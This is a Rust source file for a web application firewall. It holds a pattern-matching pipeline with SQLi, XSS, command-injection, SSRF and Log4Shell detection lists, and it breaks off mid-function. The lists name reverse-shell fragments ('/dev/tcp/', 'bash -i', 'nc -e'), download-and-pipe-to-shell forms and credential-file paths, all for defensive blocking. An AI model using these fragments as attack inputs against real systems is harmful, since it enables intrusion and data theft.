// SPDX-License-Identifier: Apache-2.0
//! Zion WAF — 5-gate request inspection pipeline (Aho-Corasick, entropy, simd-json).
//!
//! Architecture: 5-gate pipeline, fail-fast, zero-regex.
//!
//! Gate 1: Body size enforcement (O(1), no inspection)
//! Gate 2: Content-Type strict validation (zero-alloc case-insensitive)
//! Gate 3: Aho-Corasick injection scanner (SQLi/XSS/CMDi, single O(N) pass).
//!         Pattern set is selected per-profile: `Balanced` (default,
//!         high precision) or `Aggressive` (broader recall, higher FP).
//! Gate 4: Payload entropy analysis (detect obfuscated/encoded payloads).
//!         For JSON content-types the calculation is restricted to bytes
//!         inside string literals so structural punctuation does not
//!         dilute the signal. Threshold and kill-switch are per-profile.
//! Gate 5: JSON structural validation (simd-json, depth + string limits).
//!
//! Properties:
//! - Zero regex (DFA-immune to ReDoS by construction)
//! - Zero heap allocation on the fast path (GET/HEAD/DELETE/OPTIONS)
//! - Single-pass body scan via Aho-Corasick automaton
//! - All gates are O(N) or O(1) — no backtracking, no exponential blowup
//!
//! NOTE: prior versions of this header also described a sixth
//! "fixed-length profiling" gate; it was never implemented and the
//! advertisement has been removed to keep docs and code in lock-step.

use aho_corasick::AhoCorasick;
use serde::Deserialize;
use std::sync::OnceLock;

// ─────────────────────────────────────────────────────────────────────────────
// WAF Profile schema. Lives here (not in `config.rs`) so the bench surface
// in `benches/waf_streaming.rs` can construct a profile via the lib without
// pulling the whole config-loader dependency graph (auth/security/audit/etc).
// `config.rs` re-exports these via `pub use crate::waf::{WafMode, WafProfile};`
// to preserve every existing import site.
// ─────────────────────────────────────────────────────────────────────────────

/// WAF detection mode — selects which Aho-Corasick pattern set is scanned.
///
/// `Balanced` (default): high-precision patterns. SQLi/XSS tags/path traversal/
/// SSRF/XXE/Log4Shell/CRLF/SSTI/most LDAP and PHP patterns. Tuned to keep the
/// false-positive rate low for content-bearing APIs (comments, code paste,
/// docs, payloads with base64).
///
/// `Aggressive`: balanced PLUS broad-substring patterns that catch more
/// attacks but also flag legitimate developer/tooling content. Use this on
/// strict admin paths, never on user-content APIs unless you've measured the
/// FP rate. Examples added under aggressive: `alert(`, `eval(`,
/// `document.cookie`, `innerhtml`, `os.system(`, `pickle.loads`,
/// `Runtime.getRuntime`, `$gt`/`$ne`/`$regex` (unanchored MongoDB ops), and
/// generic XSS event handlers like `onclick=`/`onmouseover=`.
#[derive(Deserialize, Clone, Copy, Debug, PartialEq, Eq, Default)]
#[serde(rename_all = "lowercase")]
pub enum WafMode {
    #[default]
    Balanced,
    Aggressive,
}

#[derive(Deserialize, Clone, Debug)]
pub struct WafProfile {
    #[serde(default)]
    pub mode: WafMode,
    #[serde(default = "default_max_body_mb")]
    pub max_body_mb: u64,
    #[serde(default = "default_max_depth")]
    pub max_depth: usize,
    #[serde(default = "default_max_string_len")]
    pub max_string_len: usize,
    #[serde(default = "default_true")]
    pub deny_unknown_content_types: bool,
    #[serde(default = "default_allowed_content_types")]
    pub allowed_content_types: Vec<String>,
    /// Run Shannon-entropy gate on bodies ≥256 bytes. When true, denies
    /// requests whose entropy exceeds `entropy_threshold`. Default: true.
    /// Disable on routes that legitimately accept high-entropy payloads
    /// (binary uploads as JSON-base64, encrypted blobs, signed envelopes).
    #[serde(default = "default_true")]
    pub entropy_check: bool,
    /// Entropy threshold in bits/byte. Default: 6.5 — leaves headroom above
    /// pure base64 (6.0 theoretical max) so JWTs, signed URLs and base64
    /// payloads are not flagged. Random/encrypted content sits at ~7.5–8.0.
    #[serde(default = "default_entropy_threshold")]
    pub entropy_threshold: f64,
    /// Opt-in streaming WAF body inspection (issue #49). When `true`, the
    /// dispatcher feeds each request-body frame to a [`StreamingScanner`] as
    /// it arrives off the wire — an injection pattern in the first chunk
    /// returns 400 before the rest of the upload is read. On allow, the
    /// frames are reassembled and the regular [`validate_request`]
    /// pipeline runs on the buffered body for the encoded-payload pass +
    /// entropy + JSON gates that the streamer does not cover.
    ///
    /// Default: `false` (existing buffered behaviour). Promote to default
    /// once the bench numbers (`waf/streaming/*` in
    /// `benchmarks/results/criterion/baseline.json`) hold steady.
    #[serde(default)]
    pub streaming: bool,
}

fn default_max_body_mb() -> u64 {
    10
}
fn default_max_depth() -> usize {
    10
}
fn default_max_string_len() -> usize {
    1_048_576
}
fn default_allowed_content_types() -> Vec<String> {
    vec![
        "application/json".to_string(),
        "multipart/form-data".to_string(),
    ]
}
fn default_entropy_threshold() -> f64 {
    6.5
}
fn default_true() -> bool {
    true
}

impl Default for WafProfile {
    fn default() -> Self {
        Self {
            mode: WafMode::default(),
            max_body_mb: default_max_body_mb(),
            max_depth: default_max_depth(),
            max_string_len: default_max_string_len(),
            deny_unknown_content_types: true,
            allowed_content_types: default_allowed_content_types(),
            entropy_check: true,
            entropy_threshold: default_entropy_threshold(),
            streaming: false,
        }
    }
}

/// WAF verdict — returned from the pipeline.
#[derive(Debug, PartialEq)]
pub enum WafVerdict {
    Allow,
    Deny(&'static str),
}

// ═══════════════════════════════════════════════════════════════════
// GATE 3: Aho-Corasick Injection Scanner
// Built once at first use. Searches dozens-to-hundreds of patterns in
// O(N) over the body in a single pass.
//
// Two pattern sets:
//   * BALANCED — high-precision: tag-anchored XSS, anchored SQLi/CMDi,
//     specific SSRF endpoints, exact CVE strings (Log4Shell, XXE).
//     Default profile. Tuned to keep FP rate low for content-bearing
//     APIs (comments, code paste, docs, base64-in-JSON).
//   * AGGRESSIVE_EXTRA — adds broad, unanchored substrings
//     (`alert(`, `eval(`, `$gt`, `os.system(`, …) that catch more
//     attacks but flag legitimate developer/tooling content. Opt-in
//     via `mode = "aggressive"` on the WAF profile.
//
// Each profile gets its own automaton (built lazily, cached for the
// process lifetime). Switching costs are zero at request time — we
// just dispatch to the right `&'static AhoCorasick`.
// ═══════════════════════════════════════════════════════════════════

/// Patterns active under both `balanced` and `aggressive` modes. Anchored
/// or rare enough that false positives in real-world request bodies are
/// uncommon.
const BALANCED_PATTERNS: &[&str] = &[
    // ── SQL Injection (anchored quote/keyword combos, low FP) ──
    "' or '1'='1",
    "' or 1=1",
    "'; drop table",
    "'; delete from",
    "1; exec ",
    "1; execute ",
    "' and '1'='1",
    "waitfor delay",
    "pg_sleep(",
    // Error-based + stacked SQLi: specific function/proc names, ~0 FP.
    "extractvalue(",
    "updatexml(",
    "xp_cmdshell",
    "||(select",
    "'; shutdown",
    // ── XSS: Tags (anchored on `<`) ──
    "<script",
    "</script",
    "<svg onload",
    "<body onload",
    "<input onfocus",
    "<details ontoggle",
    "<video onerror",
    "<audio onerror",
    "<marquee onstart",
    "<math xlink",
    // ── XSS: high-signal event handlers (others moved to aggressive) ──
    "onerror=",
    "onload=",
    "srcdoc=",
    "javascript:",
    // ── Command Injection (anchored: `;`, `|`, `$(`, backtick, newline) ──
    "; cat ",
    "; ls ",
    "; rm ",
    "; wget ",
    "; curl ",
    ";cat ",
    ";ls ",
    ";rm ",
    ";wget ",
    ";curl ",
    "| cat ",
    "| ls ",
    "| rm ",
    "|cat ",
    "|ls ",
    "|rm ",
    "$(cat ",
    "$(ls ",
    "`cat ",
    "`ls ",
    "\ncat ",
    "\nls ",
    "\nwget ",
    "\ncurl ",
    // ── Command injection: unambiguous Unix forms (reverse shells, IFS bypass,
    //    brace expansion, `nc`/`bash -i`). High signal, ~0 FP on real traffic. ──
    "/dev/tcp/",
    "bash -i",
    "nc -e",
    "ncat -e",
    " -e /bin/",
    "${ifs",
    "$ifs",
    "{cat,",
    "{ls,",
    "; nc ",
    ";nc ",
    "| nc ",
    "|nc ",
    "/etc/passwd",
    "/etc/shadow",
    // ── Path Traversal ──
    "../../",
    "..\\..\\",
    "%2e%2e%2f",
    "%2e%2e/",
    "....//",
    // ── SSRF: cloud metadata endpoints (specific) ──
    "http://169.254.169.254",
    "https://169.254.169.254",
    "http://[::ffff:169.254",
    "http://metadata.google",
    "https://metadata.google",
    "http://100.100.100.200",
    "http://0xA9FEA9FE",
    "http://2852039166",
    "http://169.254.169.254.nip.io",
    "169.254.169.254/metadata",
    "http://192.0.0.192",
    "kubernetes.default.svc",
    // SSRF: internal-only URI schemes — never legitimate in user input.
    "gopher://",
    "dict://",
    // ── Windows Path Traversal ──
    "c:\\windows\\",
    "c:\\inetpub\\",
    "..\\..\\..\\windows",
    // ── Open Redirect ──
    "/\\evil",
    "/%09/",
    // ── LDAP Injection (parens-anchored) ──
    ")(cn=*",
    ")(uid=*",
    ")(mail=*",
    ")(objectclass=*",
    // ── XML/XXE ──
    "<!entity",
    "system \"file://",
    "system \"http://",
    "<xsl:",
    "xmlns:xlink",
    "<!attlist",
    // ── SSTI ──
    "#{7*7}",
    "${7*7}",
    "{{7*7}}",
    "<%=",
    "{%import",
    "#{t(java",
    // ── CRLF / Header Injection ──
    "%0d%0a",
    "%0aset-cookie:",
    "%0alocation:",
    "\r\nset-cookie:",
    // ── Log4Shell / JNDI (specific CVE patterns) ──
    "${jndi:",
    "${env:",
    "${sys:",
    // ── PHP-specific (specific URI schemes) ──
    "unserialize(",
    "php://input",
    "php://filter",
    "phar://",
    // ── GraphQL introspection (specific tokens) ──
    "{__schema",
    "{__type",
    "query{__",
];

/// Patterns added on top of BALANCED when `mode = "aggressive"`. These
/// catch more attacks but DO flag legitimate developer/code/educational
/// content. Use only on routes where the FP rate is tolerable (admin
/// panels, internal tooling), never on user-content APIs without measuring.
const AGGRESSIVE_EXTRA_PATTERNS: &[&str] = &[
    // ── Demoted from BALANCED: high false-positive rate on real traffic
    //    (prose, CMS/HTML content, config values, JS docs), so they only
    //    fire on strict/admin routes. Active XSS is still caught in balanced
    //    via the dangerous *attributes* (onerror=/onload=/javascript:/srcdoc=);
    //    XXE via "<!entity"; Log4Shell via "${jndi:". See the e2e WAF
    //    false-positive findings. ──
    "union select",
    "union all select",
    "information_schema",
    "<iframe",
    "<object",
    "<embed",
    "<img src",
    "<!doctype",
    "data:text/html",
    "ldap://",
    "ldaps://",
    "/metadata/v1",
    "/openstack/latest",
    "__proto__",
    "constructor.prototype",
    // ── SQLi: function calls / token reads (FP in BI tools, dump status) ──
    "sleep(",
    "benchmark(",
    "into outfile",
    "into dumpfile",
    "load_file(",
    "@@version",
    "char(0x",
    // ── XSS: low-anchor event handlers (FP on any code-bearing payload) ──
    "onfocus=",
    "onmouseover=",
    "onclick=",
    "oninput=",
    "onchange=",
    "onsubmit=",
    "onkeydown=",
    "onkeyup=",
    "onkeypress=",
    "ondblclick=",
    "oncontextmenu=",
    "ondragstart=",
    "ondrop=",
    "onpaste=",
    "ontouchstart=",
    "onpointerover=",
    "onanimationend=",
    "ontransitionend=",
    "onresize=",
    "onscroll=",
    "onwheel=",
    "onmouseenter=",
    "ontoggle=",
    "onpageshow=",
    // ── XSS: JS API sinks (heavy FP in MDN-style docs / code paste) ──
    "expression(",
    "alert(",
    "confirm(",
    "prompt(",
    "document.cookie",
    "document.write",
    "document.domain",
    "window.location",
    "eval(",
    "fromcharcode",
    "innerhtml",
    "outerhtml",
    "insertadjacenthtml",
    // ── Command injection: Windows tokens (FP in event-log shipping) ──
    "cmd.exe",
    "powershell",
    "& type ",
    // ── Command injection: Unix substitution + bare metachar+command. Broader
    //    (`$(` also flags jQuery/shell snippets) → aggressive routes only. ──
    "$(",
    "`id`",
    "`whoami",
    "$(id",
    "$(whoami",
    "whoami",
    "ping -c",
    "; sleep ",
    "&&sleep",
    "&& ls",
    "| sh",
    "|sh ",
    "| bash",
    "|bash",
    ">& /dev",
    " -o- | ",
    // ── NoSQL ops (no delimiter — `{"id":"$gt-23"}` falsely matches) ──
    "$gt",
    "$ne",
    "$regex",
    "$where",
    "$lookup",
    "$unionwith",
    "db.collection",
    ".find({",
    ".findone({",
    ".aggregate([",
    ".mapreduce(",
    "this.constructor",
    "{{constructor",
    "{{.constructor",
    // ── Deserialization / RCE: language-class-name patterns ──
    // (FP whenever an APM/error reporter forwards a stack trace)
    "runtime.getruntime",
    "processbuilder",
    "objectinputstream",
    "java.lang.runtime",
    "javax.script.scriptengine",
    "pickle.loads",
    "__reduce__",
    "__import__(",
    "subprocess.call",
    "subprocess.popen",
    "os.system(",
    "os.popen(",
    // ── GraphQL: lone introspection tokens (also appear in legit schemas) ──
    "__schema",
    "__type",
    "mutation{",
    // ── SSRF: loopback / internal targets (FP on legit localhost dev URLs) ──
    "http://localhost:",
    "https://localhost:",
    "://127.0.0.1",
    "http://0.0.0.0",
    "http://2130706433",
    "file:///proc",
    "ftp://127.0.0.1",
    // ── Deserialization / prototype pollution / YAML (FP on code/serialized) ──
    "o:8:\"",
    "ro0ab",
    "__proto__",
    "constructor[prototype",
    "[prototype][",
    "!!python/",
    // ── Shellshock (`() { :` — not bare `() {`, which is a legit empty fn) ──
    "() { :",
    // ── SQLi: quote-paren OR variants + comment-terminated injection ──
    "\") or (\"",
    "') or ('",
    "'--",
    // ── corpus-v2 round: high-frequency real-world misses (FP-checked vs the
    //    136-payload benign set; all aggressive-tier). ──
    // PHP stream wrappers (RCE/LFI vectors)
    "expect://",
    "data://",
    "zip://",
    "compress.",
    "ssh2.",
    // Java gadget / reflection class refs (FP on stack traces → aggressive)
    "java.io.",
    "java.net.url",
    "java.lang.process",
    "java.lang.reflect",
    "java.lang.class",
    // Command injection: Windows + bare-metachar sleep
    "| sleep",
    "& sleep",
    "net view",
    "net user",
    "dir c:",
    // Django/ORM + NoSQL lookup injection
    "__startswith",
    "__endswith",
    "__contains\"",
    "__regex",
    // SSRF: container/loopback hostnames
    "host.docker.internal",
    // PHP open tags + dangerous funcs (decoded form — high-frequency in corpus)
    "<?php",
    "<?=",
    "system(",
    "shell_exec(",
    "passthru(",
    "base64_decode(",
    "phpinfo(",
    // Perl/Ruby SSTI interpolation seen across generic
    "@{[",
    // SSRF: more internal/abusable URI schemes
    "file://",
    "jar:",
    "ftp://",
];

static BALANCED_SCANNER: OnceLock<AhoCorasick> = OnceLock::new();
static AGGRESSIVE_SCANNER: OnceLock<AhoCorasick> = OnceLock::new();

#[inline]
fn build_scanner(patterns: &[&str]) -> AhoCorasick {
    AhoCorasick::builder()
        .ascii_case_insensitive(true)
        .build(patterns)
        .expect("Failed to build Aho-Corasick automaton")
}

fn balanced_scanner() -> &'static AhoCorasick {
    BALANCED_SCANNER.get_or_init(|| build_scanner(BALANCED_PATTERNS))
}

fn aggressive_scanner() -> &'static AhoCorasick {
    AGGRESSIVE_SCANNER.get_or_init(|| {
        let mut all: Vec<&str> =
            Vec::with_capacity(BALANCED_PATTERNS.len() + AGGRESSIVE_EXTRA_PATTERNS.len());
        all.extend_from_slice(BALANCED_PATTERNS);
        all.extend_from_slice(AGGRESSIVE_EXTRA_PATTERNS);
        build_scanner(&all)
    })
}

#[inline]
fn scanner_for(mode: WafMode) -> &'static AhoCorasick {
    match mode {
        WafMode::Balanced => balanced_scanner(),
        WafMode::Aggressive => aggressive_scanner(),
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Streaming scan (Track D — opt-in path).
//
// `validate_request` buffers the entire body before scanning. That's optimal
// for small JSON / form payloads but pays peak-memory cost equal to the body
// size, and pays the full scan cost even when the offending pattern is in
// the first 64 bytes. The streaming variant solves both:
//
//   * early-exit ⇒ a payload whose first chunk contains `union select`
//     denies as soon as the first chunk is scanned, regardless of total
//     body size;
//   * peak memory ⇒ at most one chunk plus an overlap buffer of
//     `MAX_PATTERN_LEN - 1` bytes is held at a time, vs the whole body.
//
// The catch is that a pattern can straddle two chunks. We solve that by
// keeping the last `MAX_PATTERN_LEN - 1` bytes of each chunk and prepending
// them to the next. As long as no pattern is longer than `MAX_PATTERN_LEN`,
// nothing is missed.
// ─────────────────────────────────────────────────────────────────────────────

/// Upper bound on the length of any pattern shipped in BALANCED or
/// AGGRESSIVE. Verified by the `pattern_lengths_fit_max` test.
/// Bumping this is cheap (a few bytes of overlap per chunk); shrinking it
/// requires re-checking every pattern.
pub const MAX_PATTERN_LEN: usize = 64;

/// Verdict from a streaming scan. `Allow` means *every chunk consumed so
/// far* was clean — the caller is expected to keep feeding chunks until
/// the body is exhausted. `Deny` is terminal: drop the connection / 400.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum StreamVerdict {
    Allow,
    Deny(&'static str),
}

/// Stateful streaming scanner. One per request — created cheaply at the
/// start of the body validation path. Holds:
///   * a reference to the shared `AhoCorasick` automaton (no copy);
///   * a small overlap buffer carrying the last (MAX_PATTERN_LEN - 1)
///     bytes from the previous chunk, so a pattern straddling a chunk
///     boundary is still matched on the next call;
///   * a hard cap on total bytes consumed (mirrors `max_body_mb`),
///     enforced incrementally so an oversized body is rejected early.
pub struct StreamingScanner {
    scanner: &'static AhoCorasick,
    overlap: Vec<u8>,
    bytes_seen: u64,
    max_bytes: u64,
}

impl StreamingScanner {
    /// New scanner targeting the given profile. `max_body_bytes` mirrors
    /// `WafProfile::max_body_mb * 1_048_576`.
    pub fn new(mode: WafMode, max_body_bytes: u64) -> Self {
        Self {
            scanner: scanner_for(mode),
            overlap: Vec::with_capacity(MAX_PATTERN_LEN),
            bytes_seen: 0,
            max_bytes: max_body_bytes,
        }
    }

    /// Feed the next body chunk. Returns immediately on first match.
    /// Calling `feed` after a previous `Deny` result is allowed but
    /// useless — the verdict cannot un-deny.
    pub fn feed(&mut self, chunk: &[u8]) -> StreamVerdict {
        // Body-size gate, incremental.
        self.bytes_seen = self.bytes_seen.saturating_add(chunk.len() as u64);
        if self.bytes_seen > self.max_bytes {
            return StreamVerdict::Deny("body exceeds max size");
        }

        // Build the search window: the previous overlap + this chunk.
        // For typical chunk sizes (8K-64K) this is one short copy; we
        // could avoid the copy by using `aho-corasick::AhoCorasick::stream_find_iter`
        // on a `Read` adapter, but that requires an io::Read trait object
        // with extra plumbing — measurable wins should come first.
        let mut window = Vec::with_capacity(self.overlap.len() + chunk.len());
        window.extend_from_slice(&self.overlap);
        window.extend_from_slice(chunk);

        if self.scanner.is_match(&window) {
            return StreamVerdict::Deny("injection pattern detected");
        }

        // Save the trailing (MAX_PATTERN_LEN - 1) bytes for the next call.
        let keep = (MAX_PATTERN_LEN - 1).min(window.len());
        self.overlap.clear();
        self.overlap
            .extend_from_slice(&window[window.len() - keep..]);

        StreamVerdict::Allow
    }

    /// Total bytes consumed so far. Useful for emitting metrics from the
    /// caller without exposing internal state.
    ///
    /// `#[allow(dead_code)]`: dispatch tracks the size cap via the
    /// scanner's internal counter (returned as `Deny("body exceeds max
    /// size")`); this getter is exposed for benches and external
    /// consumers that want a non-deny readout.
    #[allow(dead_code)]
    pub fn bytes_seen(&self) -> u64 {
        self.bytes_seen
    }
}

// ═══════════════════════════════════════════════════════════════════
// GATE 4: Entropy Analysis
// Shannon entropy is a heuristic for "this body looks like obfuscated /
// encrypted / packed content rather than human text or normal JSON."
//
// Reference points (bits/byte):
//   * English / source code:       ~3.5–4.7
//   * JSON struct (with keys):     ~3.5–5.5
//   * Pure base64 (max theoretic): 6.0
//   * JWT / signed URL:            5.5–6.0
//   * Random / encrypted blob:     7.5–8.0
//
// The previous default (5.5) flagged any base64 / JWT in a request body —
// a foot-gun for APIs that legitimately accept signed payloads. The new
// default is 6.5, with a per-profile override (`entropy_threshold`) and
// a kill-switch (`entropy_check`).
//
// For JSON bodies we additionally restrict the calculation to the bytes
// inside string literals (keys + values, excluding structural punctuation
// and numeric literals), so low-entropy structural bytes don't dilute the
// signal.
// ═══════════════════════════════════════════════════════════════════

/// Unified WAF Normalizer (Single-Pass, Zero-Alloc)
/// Replaces recursive Cow allocations with a fast byte-by-byte state machine.
/// Normalizes:
/// - URL encoding (%XX and +)
/// - JSON unicode escapes (\uXXXX)
/// - SQL inline comments (/* ... */) -> space
fn normalize_unified(input: &[u8], out: &mut Vec<u8>) {
    out.clear();
    let len = input.len();
    let mut i = 0;
    let mut in_sql_comment = false;

    while i < len {
        // 1. SQL Comment Stripping State
        if in_sql_comment {
            if i + 1 < len && input[i] == b'*' && input[i + 1] == b'/' {
                in_sql_comment = false;
                i += 2;
                if out.last() != Some(&b' ') {
                    out.push(b' '); // Pad with space to block `1/*comment*/OR` concat
                }
            } else {
                i += 1;
            }
            continue;
        }

        if i + 1 < len && input[i] == b'/' && input[i + 1] == b'*' {
            in_sql_comment = true;
            i += 2;
            continue;
        }

        let b = input[i];

        // 2. URL Decode State
        if b == b'+' {
            push_norm(out, b' ');
            i += 1;
            continue;
        } else if b == b'%' {
            // 6-char forms first — both evade a plain %XX decoder:
            if i + 5 < len {
                let win = &input[i..i + 6];
                // Overlong-UTF-8 encodings of '/' and '\' used to slip "../"
                // past path filters (e.g. ..%c0%af..%c0%af -> ../../).
                if win.eq_ignore_ascii_case(b"%c0%af") {
                    push_norm(out, b'/');
                    i += 6;
                    continue;
                }
                if win.eq_ignore_ascii_case(b"%c1%9c") {
                    push_norm(out, b'\\');
                    i += 6;
                    continue;
                }
                // IIS-style %uXXXX -> codepoint (mirrors JSON \uXXXX). Nested
                // if-let (not an `&& let` chain) to stay within MSRV 1.82.
                if input[i + 1] == b'u' || input[i + 1] == b'U' {
                    if let (Some(h1), Some(h2), Some(h3), Some(h4)) = (
                        hex_val(input[i + 2]),
                        hex_val(input[i + 3]),
                        hex_val(input[i + 4]),
                        hex_val(input[i + 5]),
                    ) {
                        push_codepoint(
                            out,
                            ((h1 as u16) << 12)
                                | ((h2 as u16) << 8)
                                | ((h3 as u16) << 4)
                                | (h4 as u16),
                        );
                        i += 6;
                        continue;
                    }
                }
            }
            // Standard %XX.
            if i + 2 < len {
                if let (Some(hi), Some(lo)) = (hex_val(input[i + 1]), hex_val(input[i + 2])) {
                    push_norm(out, (hi << 4) | lo);
                    i += 3;
                    continue;
                }
            }
        }

        // 3. JSON Unicode State
        if b == b'\\' && i + 5 < len && input[i + 1] == b'u' {
            if let (Some(h1), Some(h2), Some(h3), Some(h4)) = (
                hex_val(input[i + 2]),
                hex_val(input[i + 3]),
                hex_val(input[i + 4]),
                hex_val(input[i + 5]),
            ) {
                push_codepoint(
                    out,
                    ((h1 as u16) << 12) | ((h2 as u16) << 8) | ((h3 as u16) << 4) | (h4 as u16),
                );
                i += 6;
                continue;
            }
        }

        // 4. Default: fold whitespace runs + lowercase for normalization
        push_norm(out, b);
        i += 1;
    }
}

/// Push one byte into the normalized buffer, folding inline-whitespace runs
/// (space, tab, vertical-tab, form-feed) to a single space and ASCII-
/// lowercasing everything else — this is what stops `union  select`,
/// `union\tselect` and `1;  cat` from slipping past the single-space patterns.
/// `\n` / `\r` are deliberately NOT folded: several command-injection patterns
/// ("\ncat ", ...) treat the newline as a separator, and collapsing it to a
/// space would make them unreachable.
#[inline]
fn push_norm(out: &mut Vec<u8>, b: u8) {
    if matches!(b, b' ' | b'\t' | 0x0b | 0x0c) {
        if out.last() != Some(&b' ') {
            out.push(b' ');
        }
    } else {
        out.push(b.to_ascii_lowercase());
    }
}

/// Push a decoded 16-bit codepoint (from `\uXXXX` or `%uXXXX`): the BMP-low
/// bytes go through `push_norm` (so a decoded space/tab still collapses and
/// letters lowercase); higher codepoints are emitted as raw UTF-8.
#[inline]
fn push_codepoint(out: &mut Vec<u8>, cp: u16) {
    if cp <= 0xFF {
        push_norm(out, cp as u8);
    } else {
        let mut utf8_buf = [0u8; 3];
        let ch = char::from_u32(cp as u32).unwrap_or('?');
        out.extend_from_slice(ch.encode_utf8(&mut utf8_buf).as_bytes());
    }
}

#[inline]
fn hex_val(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

/// Calculate Shannon entropy of a byte slice (bits per byte).
/// 0.0 = constant; 8.0 = perfectly random. Caller guarantees data.len() ≥ 1.
#[inline]
fn shannon_entropy(data: &[u8]) -> f64 {
    let mut freq = [0u32; 256];
    for &b in data {
        freq[b as usize] += 1;
    }

    let inv_len = 1.0 / data.len() as f64;
    let mut entropy = 0.0f64;
    for &count in &freq {
        if count > 0 {
            let p = count as f64 * inv_len;
            entropy -= p * p.log2();
        }
    }
    entropy
}

/// Shannon entropy computed only over bytes inside JSON string literals.
///
/// Walks the JSON byte-by-byte (no allocation, no parse), accumulating
/// frequencies for every byte seen between matching `"` delimiters. Skips
/// structural bytes (`{`, `[`, `,`, `:`, whitespace) and numeric/literal
/// tokens, all of which are low-entropy and would otherwise dilute the
/// signal of an obfuscated payload hidden inside a single string value.
///
/// `\` escape sequences are honoured (the next byte is treated as inside
/// the string and not as a closing `"`). `\uXXXX` is consumed as 5 escape
/// bytes after the `\` — we don't decode it; this is a heuristic, not a
/// validator.
///
/// Returns `None` when fewer than `min_sample` total string bytes were
/// observed — too small a sample to draw a meaningful conclusion (and the
/// caller already enforces a 256-byte body floor before invoking the
/// entropy gate, so this only triggers on JSON that is mostly structure).
fn shannon_entropy_json_strings(body: &[u8], min_sample: usize) -> Option<f64> {
    let mut freq = [0u32; 256];
    let mut total: usize = 0;
    let mut in_string = false;
    let mut escaped = false;

    for &b in body {
        if escaped {
            escaped = false;
            if in_string {
                freq[b as usize] += 1;
                total += 1;
            }
            continue;
        }
        if in_string {
            if b == b'\\' {
                escaped = true;
            } else if b == b'"' {
                in_string = false;
            } else {
                freq[b as usize] += 1;
                total += 1;
            }
        } else if b == b'"' {
            in_string = true;
        }
        // bytes outside strings (structure, numbers, whitespace) are skipped
    }

    if total < min_sample {
        return None;
    }
    let inv = 1.0 / total as f64;
    let mut entropy = 0.0f64;
    for &c in &freq {
        if c > 0 {
            let p = c as f64 * inv;
            entropy -= p * p.log2();
        }
    }
    Some(entropy)
}

// ═══════════════════════════════════════════════════════════════════
// GATE 5: JSON Structural Validation (manual byte-scan)
// No serde_json deserialization — walk the raw bytes to check:
//   - Valid JSON structure
//   - Nesting depth <= max_depth
//   - String length <= max_string_len
// ═══════════════════════════════════════════════════════════════════

// Thread-local buffer pool for simd-json and WAF zero-allocation parsing.
// Eliminates per-request heap allocation for the mutable buffer that
// simd-json and Aho-Corasick normalization require. Buffer is reused.
thread_local! {
    static JSON_BUF: std::cell::RefCell<Vec<u8>> = std::cell::RefCell::new(Vec::with_capacity(8192));
    static WAF_BUF_SEC: std::cell::RefCell<Vec<u8>> = std::cell::RefCell::new(Vec::with_capacity(8192));
}

fn validate_json_structure(body: &[u8], max_depth: usize, max_string_len: usize) -> WafVerdict {
    // Use thread-local buffer pool to avoid per-request allocation.
    // simd-json needs a mutable buffer — we copy body into the pooled buffer.
    let valid = JSON_BUF.with(|buf| {
        let mut buf = buf.borrow_mut();
        buf.clear();
        buf.extend_from_slice(body);
        // to_owned_value avoids the lifetime issue — the parsed value is owned
        // and dropped at the end of this closure, not tied to the buffer.
        simd_json::to_owned_value(&mut *buf).is_ok()
    });
    if !valid {
        return WafVerdict::Deny("malformed JSON");
    }

    // Depth + string length check via manual byte scan (zero-alloc)
    if !check_depth_and_strings_raw(body, max_depth, max_string_len) {
        return WafVerdict::Deny("JSON exceeds depth or string length limits");
    }

    WafVerdict::Allow
}

/// Raw byte scan for depth and string length — no deserialization needed.
/// Walks the JSON bytes counting { [ for depth and measuring " strings.
fn check_depth_and_strings_raw(body: &[u8], max_depth: usize, max_string_len: usize) -> bool {
    let mut depth: usize = 0;
    let mut in_string = false;
    let mut string_len: usize = 0;
    let mut escaped = false;

    for &b in body {
        if escaped {
            escaped = false;
            if in_string {
                string_len += 1;
            }
            continue;
        }

        if b == b'\\' {
            escaped = true;
            continue;
        }

        if in_string {
            if b == b'"' {
                // End of string
                if string_len > max_string_len {
                    return false;
                }
                in_string = false;
                string_len = 0;
            } else {
                string_len += 1;
            }
        } else {
            match b {
                b'"' => {
                    in_string = true;
                    string_len = 0;
                }
                b'{' | b'[' => {
                    depth += 1;
                    if depth > max_depth {
                        return false;
                    }
                }
                b'}' | b']' => {
                    depth = depth.saturating_sub(1);
                }
                _ => {}
            }
        }
    }

    true
}

// ═══════════════════════════════════════════════════════════════════
// MAIN PIPELINE
// ═══════════════════════════════════════════════════════════════════

/// Validate an incoming request through the 5-gate WAF pipeline.
/// Each gate is fail-fast: first deny wins, no further inspection.
#[inline]
pub fn validate_request(
    method: &str,
    content_type: Option<&str>,
    body: &[u8],
    profile: &WafProfile,
) -> WafVerdict {
    // ── Gate 1: Body size (O(1)) ──
    let max_body_bytes = profile.max_body_mb * 1_048_576;
    if body.len() as u64 > max_body_bytes {
        return WafVerdict::Deny("body exceeds max size");
    }

    // Methods without body semantics: skip body inspection.
    // DELETE can carry a body (RFC 9110) — some APIs use it.
    if !matches!(method, "POST" | "PUT" | "PATCH" | "DELETE") {
        return WafVerdict::Allow;
    }

    if body.is_empty() {
        return WafVerdict::Allow;
    }

    // ── Gate 2: Content-Type (zero-alloc case-insensitive) ──
    let ct = match content_type {
        Some(ct) => ct,
        None => return WafVerdict::Deny("missing content-type header"),
    };
    // Prefix match with delimiter check: "application/json" must be followed
    // by EOF, ';' (charset), or ' ' — not arbitrary chars. Without this,
    // "application/jsonFOO" would be treated as allowed.
    let is_allowed = profile.allowed_content_types.iter().any(|allowed| {
        if ct.len() < allowed.len() {
            return false;
        }
        if !ct.as_bytes()[..allowed.len()].eq_ignore_ascii_case(allowed.as_bytes()) {
            return false;
        }
        ct.len() == allowed.len()
            || ct.as_bytes()[allowed.len()] == b';'
            || ct.as_bytes()[allowed.len()] == b' '
    });
    // Strict policy denies a disallowed type outright. Lenient policy does NOT
    // trust it either — we fall through to the Gate 3 injection scan before
    // allowing. The previous code returned Allow here, forwarding the body
    // UNSCANNED whenever deny_unknown_content_types was false, letting an
    // attacker smuggle a payload past the WAF just by mislabelling it.
    if !is_allowed && profile.deny_unknown_content_types {
        return WafVerdict::Deny("unexpected content-type for API request");
    }
